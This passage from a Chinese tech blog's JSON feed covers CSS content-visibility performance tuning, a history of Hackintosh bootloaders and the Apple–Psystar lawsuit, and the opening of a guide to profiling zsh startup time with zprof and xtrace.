提供对该属性的支持（没错，Firefox 把这个 Feature 也扔进「值得一试」里了）。更多关于 <code>content-visibility</code> 的介绍可以查看 <a href=\"https://web.dev/content-visibility/\">web.dev 上的相关文章</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/10.jpg\" width=\"1600\" height=\"1108\" class=\"lazy post-img\"></p>\n<p>使用 <code>content-visibility</code> 属性需要将页面内容分块。于是我写了一个 Hexo 插件，在文章内容渲染时将每两个 <code>&lt;h2&gt;</code> 之间的内容分为一块、用 <code>&lt;div class=\"story\"&gt;</code> 包裹起来。然后为 <code>.story</code> 声明 <code>content-visibility: auto</code>。</p>\n<p>需要注意的是，<code>content-visibility</code> 绕过的是不在当前 viewport 的元素的后代元素的样式和布局、只保留一个元素盒子。如果没有显式声明元素的高度的话那么这个元素的高度就是 0 了。虽然 Chrome/Chromium 在实现 <code>content-visibility</code> 时会试图避免 Curative Layout Shift（在元素即将进入 viewport 时就开始渲染），但是滚动条的高度会发生改变。所以「CSS Containment」草案中还提出了一个新属性 <code>contain-intrinsic-size</code>、用于声明一个「元素盒子」的高度。这个属性不影响渲染后元素的实际尺寸，实际使用时只需要预估高度即可：</p>\n<pre><code class=\"hljs css\"><span class=\"hljs-selector-class\">.story</span> {  <span class=\"hljs-attribute\">content</span>-<span class=\"hljs-attribute\">visibility</span>: auto;  contain-intrinsic-size: <span class=\"hljs-number\">1000px</span>; // 不靠谱地取个 <span class=\"hljs-number\">1000px</span>}</code></pre>\n<blockquote><p><code>content-visibility</code> 除了可以改善 Layout 性能外，值得一提的还有其另一个取值 <code>hidden</code>。众所周知 <code>display: none</code> 会使元素「离线」，元素会从 DOM 中消失、同时渲染状态也会随之消失；而 <code>visibility: hidden</code> 只是会隐藏元素、而元素本身依然保留在 DOM 中，渲染状态也保留。而 <code>content-visibility: hidden</code> 则介于两者之间，元素会从 DOM 中消失、但是保留渲染属性。</p></blockquote>\n<p>利用 <code>content-visibility</code> 和 <code>contain-intrinsic-size</code> 后，文章的 Layout 时间从 120ms 减少到了 70ms、减少了将近 40%，只能希望越来越多的浏览器能够提供对这两个属性的支持了。</p>\n<div class=\"license\">\n<div class=\"license-title\">再快一点，再快一点 —— 优化博客白屏时间的实践</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/improve-fcp-for-my-blog/\">https://blog.skk.moe/post/improve-fcp-for-my-blog/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-10-03</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/improve-fcp-for-my-blog/"},{"title":"黑苹果的历史","date":"2020-09-02 21:45:00","description":"\n<h2>楔子：第一台「黑苹果」</h2>\n<p>如果按照「黑苹果」的定义 —— 在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统 —— 那么全世界第一台「黑苹果」应该诞生于 24 年前。1996 年，苹果将 Macintosh 电脑切换到 IBM 的 PowerPC 架构。时任苹果 CEO Gil Amelio 借此机会，与一些使用和 Macintosh 同款 CPU 和主板的厂商（如摩托罗拉）签约，授权他们的 PC 预装苹果的 Macintosh System 7（即 Classic Mac OS 7）。</p>\n<p>然而，1997 年 7 月发生了两件事。一件事是乔布斯回到苹果、被正式任命为苹果公司的 CEO，另一件事是 7 月 26 日 Mac OS 8 正式发布。</p>\n<p>Mac OS 8 并没有带来革命性的更新 —— 这个版本原本应该被命名为 Mac OS 7.7 。但是苹果公司前 CEO 同第三方厂商签订的系统授权协议是基于 Macintosh System 7 的。乔布斯选择发布 Mac OS 8.0，巧妙地利用命名和版本号的不同，直接把后续的服务和协议一起中断掉了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/1.png\" width=\"405\" height=\"599\" class=\"lazy post-img\"></p>\n<blockquote><p>摩托罗拉生产的 StarMax 兼容机，可以直接安装 System 7。</p></blockquote>\n<h2>从 PowerPC 到 x86</h2>\n<p>把 Macintosh System 7 的授权协议理解为黑苹果有些取巧了。要谈现代的黑苹果，那么一定不能无视苹果迈向 x86 的道路，所以让我们把时间再倒回去 5 年吧。</p>\n<p>1992 年 2 月 14 日，苹果开展了一项秘密计划「Star Trek」，将 Macintosh System 7（Classic Mac OS 7）连同其应用程序迁移到 Intel 架构兼容的 PC 机（采用 Intel 486 处理器）上，并要求在 12 月 1 日就拿出第一台原型机。苹果的工程师夜以继日的重构，终于赶在 Deadline 之前完成了 System 7 和 QuickTime 的移植。但是随着苹果时任 CEO John Sculley 离开公司，接任的 CEO Michael Spindler 更青睐 PowerPC 架构，Star Trek 随即被取消。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/2.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Macintosh System 7 的界面截图</p></blockquote>\n<p>虽然 Star Trek 被取消，但是仍然有部分苹果工程师努力将 Mac OS 移植到 x86 平台，其中成果最显著的是工程师 John Kullman，他在 2001 年 12 月成功将 Mac OS X 移植到了 x86 的 Quora PC 上。被称为「Mac OS X 之父」的 Bertrand Serlet（他后来成为 10.4 Tiger、10.5 Leopard 和 10.6 Snow Leopard 主要负责人）得知此事后与 John Kullman 会面，希望他将 Mac OS X 移植到一台索尼 VAIO 笔记本上。John Kullman 在当天晚餐之前就完成了任务。第二天，乔布斯就带着这台 VAIO 飞往东京，与索尼时任社长安藤国威会面，商讨有关在索尼的 VAIO 上运行 Mac OS X 的事宜，但谈判无疾而终。</p>\n<p>即使「索粉」乔布斯未能和索尼达成合作，苹果内部仍然于 2002 年进行了一项新的秘密计划「Marklar」，目的是继续维持 Mac OS X 与 x86 的兼容性。直到 2005 年 6 月 6 日，苹果在旧金山莫斯康展览中心举办了 WWDC 2005，乔布斯正式宣布他们将把个人电脑产品线 <a href=\"https://www.apple.com/newsroom/2005/06/06Apple-to-Use-Intel-Microprocessors-Beginning-in-2006/\">从 PowerPC 架构转变为 Intel 架构</a>。2006 年 1 月 10 日，苹果发布了第一台使用 Intel Core（英特尔酷睿）的 MacBook Pro，代替先前的产品线 PowerBook。12 月 28 日，苹果发布了 Mac Mini，同样搭载了 Intel Core 处理器。2007 年 4 月 5 日，苹果推出 Boot Camp（启动转换），4 月 24 日，苹果推出 17 寸的 MacBook Pro，5 月 16 日，苹果推出 12 寸的 MacBook 以代替 iBook 产品线，7 月 5 日，苹果推出 iMac 以代替 eMac 产品线，8 月 7 日，苹果推出新的高端电脑产品线 Mac Pro。2009 年 8 月，苹果推出 Mac OS X 10.6 Snow Leopard，这是第一个只支持 x86 的 Mac OS X，宣告苹果正式放弃了对 PowerPC 的支持。</p>\n<h2>黑苹果的第一道曙光</h2>\n<p>回到 WWDC 2005，苹果向开发者推出了搭载 Intel 处理器的 DTK（Dev Transition Kit），搭载了兼容 Intel 的 Mac OS X 10.4.1。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/3.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Mac OS X 10.4.1 Tiger 开发版运行在搭载了 Intel 处理器的 DTK 上。</p></blockquote>\n<p>很快，就有人尝试在非苹果硬件上运行开发版的 Mac OS X，但是该系统拒绝在普通的 PC 上运行：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/4.png\" width=\"724\" height=\"400\" class=\"lazy post-img\"></p>\n<blockquote><p>当试图在非 Mac 平台上安装开发版的 Mac OS X Tiger 10.4.1 时会看到上图的提示信息：Darwin/x86 不支持你的硬件配置。</p></blockquote>\n<p>当时，将 Mac OS X Tiger 10.4.1 运行在普通的 PC 上有三大障碍：第一是指令集，DTK 内置的 <a href=\"https://ark.intel.com/content/www/cn/zh/ark/products/27484/intel-pentium-4-processor-660-supporting-ht-technology-2m-cache-3-60-ghz-800-mhz-fsb.html\">Intel Pentium 4 660 CPU</a> 支持 SSE-3 指令集，但是 2004 年前后的 PC 常见的处理器都不包括该指令集；其次是芯片组，Mac OS X 开发版只支持 Intel 915G/ICH6 芯片组；最后，当时的苹果的 DTK 使用了 Infineon TPM 安全芯片。讽刺的是，最难克服的障碍其实不是硬件或安全芯片，而是指令集。</p>\n<p>目前可考的第一台成功的黑苹果诞生于 2005 年 8 月 10 日，那一天 <a href=\"https://web.archive.org/web/20051018182314/http://hardmac.com/news/2005-08-10/\">HardMac 网站收到匿名开发者发来的两段视频</a>，视频中展示了 Mac OS X 10.4.1 Tiger 运行在搭载 Pentium M 735 处理器的 Mitac 8050D 笔记本上。</p>\n<blockquote><p>值得一提的是，2006 年 1 月 10 日苹果发布 MacBook Pro，相比传统 x86 主板使用 BIOS 引导（Legacy），MacBook Pro 使用了 UEFI 引导方式。</p></blockquote>\n<p>2006 年 2 月 14 日，「The Guru」团队的成员 Maxxuss（crg92）发布了首个 Patch 补丁。通过该补丁修补 XNU 内核即可解除引导和安装限制、在任何内置 SSE-2 指令集的 Intel 处理器上运行 Mac OS X 10.4.4，今天 <a href=\"https://www.insanelymac.com/forum/topic/9071-1044-security-broken/?page=1\">在 InsanelyMac 上仍然可以找到当时的帖子</a>。几小时之后苹果发布了 10.4.5 版本的 Mac OS X，又过了两周 crg92 就放出了新的针对 10.4.5 的补丁。</p>\n<p>苹果随后的几个月内发布了 Mac OS X 10.4.6 和 10.4.7，OSx86 社区成员设法将这些系统中的新版本的内核替换为 10.4.4 和 10.4.5 的旧内核、实现将这些新版本的系统安装在 PC 上。但是从 10.4.8 开始，苹果开始更广泛地使用 SSE-3 指令集，意味仅仅通过修补 XNU 内核已经无法再兼容只支持 SSE-2 指令集的处理器（如早期的奔腾 4）。来自新西兰的 macOS、iOS 开发者与逆向工程师 <a href=\"http://mifki.com/\">Mfiki</a>（Vitaly Pronkin）于 2006 年 12 月 24 日放出了一个新的更精简的 Patch 以使 XNU 内核兼容 SSE2；而开发者 Semthex 则制作了一个通过 SSE-2 模拟 SSE-3 的指令集模拟器。 </p>\n<p>Mac OS X 10.5 Leopard 于 2007 年正式发布，随后 BrazilMac 发布了一个通用补丁。用户可以通过购买 Mac OS X 零售版的安装光盘、打上补丁即可让 XNU 内核运行在普通 Intel PC 上。之后，数个黑客和开发者（如 Lorem、SynthetiX、ToH、StageXNU 团队）都纷纷释出了内核补丁。同时，基于这些补丁制作的 Mac OS X「发行版」开始出现，如 iATKOS、<a href=\"https://www.insanelymac.com/forum/topic/77069-kalyway-1051-dvd-release-the-official/\">KALYWAY</a> 和 <a href=\"http://ipcosx86.wikidot.com/\">iPC</a>。</p>\n<blockquote><p>之后随着 EFI 引导方法的流行，这些发行版都逐渐改为在系统中内置 Boot-132 或 Chameleon。</p></blockquote>\n<h2>中场休息：对美国法院的一瞥</h2>\n<p>2008 年 4 月，一家名为 Psystar 的公司在美国佛罗里达州注册。这家公司计划公开销售 Intel PC，预装内置 BrazilMac 补丁的 Mac OS X 10.5 Leopard。这种 PC 一开始被称为「OpenMac」，很快又被更名为「Open Computers」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/6.jpg\" width=\"450\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>Pystar 的「OpenMac」</p></blockquote>\n<p>2008 年 7 月 3 日，苹果在加利福尼亚州地区法院起诉 Pystar 公司，声称 Pystar 公司侵犯了苹果的版权、违反了数字千年版权法案（DMCA），「避开、绕过、移除、解扰、解密、停用、破坏苹果保护机制」。</p>\n<p>2008 年 8 月 28 日，Pystar 公司在佛罗里达州地区法院起诉苹果，声称苹果公司存在垄断和其它不正当竞争行为。2008 年 11 月 18 日，Pystar 公司的起诉被驳回。</p>\n<p>2009 年 2 月 5 日，<a href=\"http://www.computerworld.com/s/article/9127579/Mac_clone_maker_wins_legal_round_against_Apple\">Pystar 公司赢得苹果第一轮的版权诉讼</a>。<strong>这一判例意味着苹果的 EULA 中的「禁止在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统」条款可能是没有法律效力的</strong>。</p>\n<p>2009 年 4 月，苹果的新闻发言人表示 Pystar 公司没有依法公开任何财务信息（利润、资产、负债）。Pystar 的 CEO 兼创始人对此拒绝置评，并仍然拒绝透露任何财务信息。</p>\n<p>2009 年 5 月 26 日，Pystar 公司申请破产保护，试图通过破产保护法案拖延苹果的诉讼。在申请破产期间，Pystar 公司仍然在销售预装 Mac OS X 的 PC，因此 2009 年 6 月法院解除了苹果的诉讼中止，使苹果可以继续起诉 Pystar 公司。2009 年 8 月 12 日，Pystar 公司的破产保护申请被佛罗里达地区法院驳回。</p>\n<p>2009 年 11 月 13 日，加利福尼亚州地方法院判定 Pystar 违反了 DMCA 和侵犯了苹果的版权，定于 12 月 14 日举行听证会。2009 年 12 月 15 日，加利福尼亚州法院发表永久性禁令，禁止 Pystar 制造、分发、协助任何人安装任何版本（包括未来版本）的 Mac OS X。2010 年 1 月 16 日，Pystar 公司提起上诉。2012 年 5 月 14 日，最高法院驳回了 Pystar 公司的上诉，苹果赢得了最终的诉讼。</p>\n<h2>向 Chameleon（变色龙）进发</h2>\n<p>回到 WWDC 2005 上发布的搭载 Intel DTK，内置了一个名为 Boot-132 的 UEFI Bootloader 用于加载 XNU 内核。。当时 Intel 的 UEFI 还是新鲜产物、几乎所有的 PC 都在使用 BIOS 引导（也就是现在被称为 Legacy BIOS 的引导方法）。Boot-132 后来随 Mac OS X 10.4.8 的 XNU 内核一起开源，所以在 2007 年，David Elliott 基于 Linux 的 GRUB Bootloader 和苹果 Boot-132 的源码开发了一个初级的 Bootloader，能够为使用 Legacy BIOS 引导的 PC 提供一个「模拟 UEFI」环境用于加载 XNU 内核。</p>\n<blockquote><p>除了 Boot-dfe，David Elliott 的作品还包括初版的 <a href=\"http://tgwbd.org/darwin/extensions.html#NullCPUPowerManagement\">NullCPUPowerManagement</a>，用于兼容苹果的电源管理 AppleIntelCPUPowerManagement。</p></blockquote>\n<p>2008 年，Voodoo 团队（原 StageXNU 团队，你应该记得在上个章节中看到过这个名字）将 David Elliott 开发的「模拟 UEFI」实现与苹果原始的 Boot-132 结合，制作了 Chameleon（变色龙）项目。随着 Chameleon 的不断迭代更新，许多功能如注入 Device Properties（设备属性）、加载 Kernel Extension（内核扩展，即 kext）、修补 ACPI、模拟 SMBIOS 机型、图形化界面的启动菜单都一一被支持。Voodoo 团队还开发了数个 kext 如 VoodooPower、VoodooSDHCI 以及在 Hackintosher 中耳熟能详的 VoodooHDA 和 VoodooPS2Controller。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/5.png\" width=\"419\" height=\"330\" class=\"lazy post-img\"></p>\n<blockquote><p>在 QEMU 虚拟机中通过 Chameleon 2.1.0 引导 PureDarwin，该版本的变色龙已经支持图形化引导界面。</p></blockquote>\n<p>由于变色龙的出现，越来越少的人选择反编译修改 XNU 内核、而是通过 Bootloader 替换 DSDT、注入设备属性和 kext。<strong>考虑到数字千年版权法（DMCA）禁止修改并分发 macOS 中非开源部分的操作系统代码，使用 Bootloader 引导黑苹果无需直接修改操作系统或 XNU 内核本身、因而成功绕过了这一法律。</strong></p>\n<p>2009 年，Mac OS X 10.6 Snow Leopard 正式发布，这是第一个完全放弃 PowerPC 架构的 Mac OS X 版本。来自俄罗斯的 <a href=\"http://netkas.org/\">Netkas</a> 率先释出了一个修改版的变色龙 EFI 可以用于引导 Mac OS X 10.6。紧接着，Voodoo 团队也释出了兼容 10.6 的官方版本更新。</p>\n<blockquote><p>除了率先使变色龙兼容 Mac OS X 10.6，Netkas 还开发了 FakeSMC 和 HWSensor。现在 Netkas 致力于拓展 AMD 显卡的兼容性（如在 macOS 10.14 Mojave 为 Raedon RX560 启用 Metal 支持、避免 Raedon W5700 在 macOS 10.15.5 上引发 Kernel Panic 等）。</p></blockquote>\n<p>2011 年，Mac OS X 10.7 Lion 发布。这是苹果第一个不再提供安装光盘的 Mac OS X 版本，也是第一个支持 SSD TRIM 的 Mac OS X 版本。来自俄罗斯的 Michael Belyaev（usr-sse2）率先找到了安装方法，将修改版安装镜像写入到 USB 存储设备，并通过 XPC EFI Bootloader（一个基于 DUET 的模拟 EFI 引导器）启动 XNU 内核。</p>\n<blockquote><p>usr-sse2 现在是 acidanthera 团队的活跃成员，参与了 OpenCore 和 VirtualSMC 等的开发。截至本文写就，usr-sse2 正在研究苹果的 IO80211Family。</p></blockquote>\n<p>同年，来自 tonymacx86 的 MacMan 开发了 <a href=\"https://tonymacx86.blogspot.com/2011/04/chimera-unified-chameleon-bootloader.html\">变色龙的一个分支 Chimera</a>。tonymacx86 社区提供的工具 UniBeast（以及后来的 MultiBeast）内置了 Chimera、大大简化了黑苹果的安装。</p>\n<h2>来到 Clover（四叶草）的时代</h2>\n<p>不论是 David Elliott 的 Boot-dfe 还是变色龙，都是基于一个模拟的 EFI 环境。这意味着：</p>\n<ul>\n<li>黑苹果不能安装 BootCamp 实现 Windows 和 Mac OS X 之间切换</li>\n<li>黑苹果无法进入恢复模式，因为变色龙无法引导 Recovery HD 分区</li>\n<li>黑苹果的硬盘不能使用 GUID 分区表（GPT），因为变色龙不支持 GPT、只支持 MBR</li>\n</ul>\n<p>微软从 Windows 7 开始对 UEFI 引导提供初步支持、主流 PC 和笔记本厂商都逐渐用 EFI 代替 Legacy BIOS；同时随着大于 2TiB 的硬盘的出现，GPT 越来越流行，Hackintosher 对支持 GPT 的、真正的 UEFI Bootloader 的呼声越来越高。</p>\n<p>Clover 的历史可以回溯到 2006 年出现的一个 FreeBSD 发行版 TrueOS。TrueOS 社区的 Christoph Pfisterer 开发了一个带有图形化界面的 UEFI Bootloader「rEFIt」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/7.png\" width=\"803\" height=\"378\" class=\"lazy post-img\"></p>\n<p>2011 年 Christoph Pfisterer 中止了 rEFIt 的开发。次年，开发者 Roderick W. Smith Fork 了 rEFIt、成立了 rEFInd 项目。同年，Slice 和 OSx86 社区讨论开发一个 UEFI Bootloader：除了支持和变色龙一样模拟 EFI 环境外、还需要兼容真正的 UEFI 环境；要能正确读取 HFS+ 分区；式、能够修补 ACPI、加载 kext、加载 SMBIOS、内置 Quirk 以在 PC 上启动 macOS。社区决定这个 Bootloader 应该基于 rEFInd 开发。2012 年，OS X 10.8 Mountain Lion 正式发布，同年 Clover 发布了第一个版本：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/8.png\" width=\"622\" height=\"533\" class=\"lazy post-img\"></p>\n<p>2014 年 10 月 16 日 OS X 10.10 Yosemite 发布，次日 Voodoo 团队发布了变色龙最后一个正式版本 2.2，提供了 Yosemite 的引导支持。</p>\n<blockquote><p>正是从 OS X 10.10 Yosemite 开始，Hackintosher 开始倾向于使用苹果发布的原始 OS X 系统镜像、使用尽可能少的 kext 和 Patch，以保证黑苹果的稳定性。</p></blockquote>\n<p>2015 年 9 月 30 日，OS X 10.11 El Capitan 发布，tonymacx86 出品的黑苹果安装工具 UniBeast 将内置的 Bootloader 从变色龙的分支 Chimera 替换为 Clover，正式宣告变色龙寿终正寝。</p>\n<h2>尾声：几个时间</h2>\n<p>截至本文写就，macOS 11.0 Big Sur 已经进入 Public Beta 5，苹果已经宣布未来 Mac 将会从 Intel 切换到 ARM 架构的 Apple Silicon。不少 Hackintosher 都在担心黑苹果的未来。本文就以对几个时间点的探讨作为结尾吧。</p>\n<h3>Clover 用了多久才取代了 Chameleon（变色龙）？</h3>\n<ul>\n<li>2008 年初 Chameleon 发布了首个版本</li>\n<li>2012 年 Clover 发布了首个版本</li>\n<li>2014 年 10 月 17 日 Chameleon 发布了最后一个版本</li>\n</ul>\n<p>Clover 从发布第一个版本发布到取代 Chameleon 只用了 2 年。</p>\n<h3>苹果从 PowerPC 切换到 Intel 用了多久？</h3>\n<ul>\n<li>2005 年 6 月 6 日苹果召开 WWDC 2005，宣布苹果将从 PowerPC 切换到 Intel</li>\n<li>2006 年 1 月 10 日苹果发布了第一台使用 Intel 的 MacBook Pro</li>\n<li>2009 年 8 月 28 日苹果发布了 Mac OS X 10.6 Snow Leopard，正式停止对 PowerPC 的支持。 </li>\n</ul>\n<p>也就是说，苹果从宣布切换到 Intel 到 Mac OS X 放弃 PowerPC 支持用了 4 年。</p>\n<h3>OpenCore 什么时候会取代 Clover？</h3>\n<p>OpenCore 0.0.1 发布于 2019 年 5 月 4 日。如果 Clover 只用了两年就完成了从发布到取代变色龙，那么明年 OpenCore 就会完全取代 Clover（指 Clover 终止开发）。然而抛开历史背景讲历史就是在耍流氓，前面的章节我们看到了变色龙的诸多缺陷（模拟的 UEFI、不支持 GPT 等），被 Clover 取代是必然的。但是现在 Clover 并没有明显的弊端、而 OpenCore 也没有非常显著的优势，加之 Clover 的维护仍然非常活跃，因此在可预见的未来中 Clover 和 OpenCore 仍然会同时存在。</p>\n<h3>苹果什么时候会放弃 Intel 的 x86 架构？</h3>\n<p>这可能是 Hackintosher 们最关心的问题了。如果套用苹果从 PowerPC 切换 Intel 的时间表，那么苹果会在 WWDC 开完后第二年（也就是 2021 年）就会将所有 Mac 切换为 ARM 架构（不再发布搭载 Intel 处理器的 Mac）、而 macOS 则会在三年后（也就是 2024 年）正式放弃对 Intel 处理器的支持。</p>\n<p>但是，现在苹果的策略和 15 年前的还是存在着重大区别 —— WWDC 2005 开完以后，苹果在 2005 年下半年没有再发布任何新 Mac，主要是释出现有的 PowerPC 架构的 Mac 的性能升级（增加运行内存、硬盘扩容等），接着整个 2006 年都没有发布 PowerPC 架构的 Mac、全部产品线都切换到 Intel 架构；而 WWDC 2020 之后，苹果却还是发布了搭载 10 代 Intel 处理器的 27 寸的 iMac 2020。显然，这一次苹果在更换架构这件事上要保守许多，苹果甚至可能在到 2021 年都会发布搭载 Intel 11 代处理器的 Mac。</p>\n<p>另外，我们还可以再列一张关于 macOS 的时间表：</p>\n<ul>\n<li>OS X 10.10 Yosemite 发布于 2014 年 10 月 16 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2015 年 8 月 15 日。</li>\n<li>OS X 10.11 El Caption 发布于 2015 年 9 月 30 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2018 年 7 月 9 日。</li>\n<li>macOS 10.12 Sierra 发布于 2016 年 9 月 20 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 9 月 26 日。</li>\n<li>macOS 10.13 High Sierra 发布于 2017 年 9 月 25 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.14 Mojave 发布于 2018 年 9 月 24 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.15 Catalina 发布于 2019 年 10 月 7 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，截至本文写就仍在维护。</li>\n<li>macOS 11.0 Big Sur 于 2020 年 6 月 22 日开始内测，兼容 2013 年上半年发布的 MacBook Air，截至本文写就仍处于公测阶段。</li>\n</ul>\n<p>通过这张时间表可以发现，过去 6 年的每个 macOS 大版本都会兼容至少 7 年以前发布的设备。因此就算苹果从 2021 年开始再也不发布搭载 Intel 处理器的 Mac，macOS 可能也需要到 2025 年才会终止对 Intel 处理器的支持。</p>\n<div class=\"license\">\n<div class=\"license-title\">黑苹果的历史</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/history-osx86/\">https://blog.skk.moe/post/history-osx86/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-09-02</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/history-osx86/"},{"title":"我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化","date":"2020-08-10 03:59:00","description":"\n<p>不论是在 WSL、Linux 还是 macOS 上，强大的 zsh 一直是我的不二法宝，而 oh my zsh 自然成了最趁手的瑞士军刀，我自己还编写了数个 oh my zsh 插件和主题。直到有一天我突然发现：见鬼，为什么开个 iTerm2 的 Tab 要等上好几秒钟？</p>\n<span></span><h2>zsh 启动耗时测量</h2>\n<p>首先，我们需要一个客观衡量 zsh 启动速度的标准，而使用 macOS 和众多 Linux 发行版中自带的 <code>time</code> 可以轻松计算任何命令的执行用时，包括 shell：</p>\n<pre><code class=\"hljs bash\">$ /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>        1.77 real         1.04 user         0.95 sys</code></pre>\n<p><code>time</code> 输出了 zsh 启动时 user-land 和 system 用时，而我的 zsh 启动用时将近 2 秒钟。为了获得更精确的结果，使用 for 循环连续启动 zsh 5 次：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        1.74 real         1.02 user         0.92 sys        1.69 real         1.00 user         0.90 sys        1.71 real         1.01 user         0.91 sys        1.68 real         0.99 user         0.89 sys        1.74 real         1.02 user         0.93 sys</code></pre>\n<p>为了排除 zsh 本身的性能问题，使用 zsh 的 <code>--no-rcs</code> 参数进行测试：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 20); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh --no-rcs -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys</code></pre>\n<p>不加载 <code>.zshrc</code> 时，zsh 的启动速度是如此的快，以至于 <code>time</code> 给出了 <code>0.00</code> 的结果。</p>\n<h2>Profiling</h2>\n<p>zsh 提供了专门的 profiling 模块 <code>zprof</code> 用于衡量 zsh 各个函数的执行用时。在 <code>.zshrc</code> 文件第一行添加下述命令用于加载 <code>zprof</code> 模块：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/<span class=\"hljs-built_in\">zprof</span></code></pre>\n<p>接着启动 zsh、并使用 <code>zprof</code> 命令获取各函数用时数据：</p>\n<pre><code class=\"hljs bash\">$ /bin/zsh$ <span class=\"hljs-built_in\">zprof</span>num  calls                time                       self            name----------------------------------------------------------------------------------- 1)    1         395.66   395.66   33.10%    395.59   395.59   33.09%  _zsh_nvm_auto_use 2)    1         216.22   216.22   18.09%    216.13   216.13   18.08%  nvm_die_on_prefix 3)    1         648.00   648.00   54.20%    168.85   168.85   14.12%  nvm_auto 4)    2         479.15   239.57   40.08%    160.50    80.25   13.43%  nvm 5)    1         102.30   102.30    8.56%     84.99    84.99    7.11%  nvm_ensure_version_installed 6)    2          51.21    25.60    4.28%     29.55    14.78    2.47%  compinit 7)    1         680.18   680.18   56.89%     22.17    22.17    1.85%  _zsh_nvm_load 8)    2          21.66    10.83    1.81%     21.66    10.83    1.81%  compaudit 9)    1          17.31    17.31    1.45%     17.31    17.31    1.45%  nvm_is_version_installed10)  193          17.43     0.09    1.46%     14.50     0.08    1.21%  _zsh_autosuggest_bind_widget[Redacted]</code></pre>\n<p><code>zprof</code> 模块只能获取每个 zsh 函数的用时，因此适合找出拖累 zsh 冷启动的 oh my zsh 的插件。如果要获取完整的 <code>.zshrc</code> 性能分析，应该使用 <code>xtrace</code>。在 <code>.zshrc</code> 开头添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/datetime<span class=\"hljs-built_in\">setopt</span> PROMPT_SUBSTPS4=<span class=\"hljs-string\">'+$EPOCHREALTIME %N:%i&gt; '</span>logfile=$(mktemp zsh_profile.7Pw1Ny0G)<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Logging to <span class=\"hljs-variable\">$logfile</span>\"</span><span class=\"hljs-built_in\">exec</span> 3&gt;&amp;2 2&gt;<span class=\"hljs-variable\">$logfile</span><span class=\"hljs-built_in\">setopt</span> XTRACE</code></pre>\n<p>并在 <code>.zshrc</code> 结尾添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">unsetopt</span> XTRACE<span class=\"hljs-built_in\">exec</span> 2&gt;&amp;3 3&gt;&amp;-</code></pre>\n<p>这会在 <code>$HOME</code> 目录下生成一个文件名包含随机字符串的文件（<code>zsh_profile.123456</code> ）。一些介绍 zsh 